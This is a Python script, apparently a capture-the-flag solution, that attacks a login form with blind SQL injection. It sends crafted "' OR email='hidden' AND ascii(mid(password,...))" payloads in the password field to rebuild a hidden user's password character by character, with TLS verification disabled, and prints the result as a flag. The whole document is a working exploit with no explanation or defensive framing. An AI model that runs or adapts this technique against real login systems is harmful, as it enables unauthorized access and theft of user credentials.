import requests, urllib3
urllib3.disable_warnings()

url = 'http://target/'
MY_EMAIL = 'attacker@example.com'
MY_ID = 1

def test(passwd):
    data = {'login_email': MY_EMAIL, 'login_pass': passwd, 'login': 'Login'}
    r = requests.post(url, data=data, verify=False, timeout=5)
    return 'name' in r.text

# Extract hidden agent's password using blind SQLi
# The hidden user has email='hidden' in the database
charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$_{}"
print("Extracting hidden agent password via blind SQLi...")

# Method: use mid() on password of hidden user by checking via our oracle
extracted = ""
for i in range(1, 50):
    found = False
    for c in charset:
        # Use a correlated approach: login as hidden user character by character
        payload = f"' OR email='hidden' AND ascii(mid(password,{i},1))={ord(c)} #"
        data = {'login_email': 'hidden', 'login_pass': payload, 'login': 'Login'}
        r = requests.post(url, data=data, verify=False, timeout=5)
        if 'Agent' in r.text or 'hidden' in r.text.lower():
            extracted += c
            print(c, end='', flush=True)
            found = True
            break
    if not found:
        break

print(f"\nHidden agent password: {extracted}")
print(f"Flag: {{{extracted}}}")
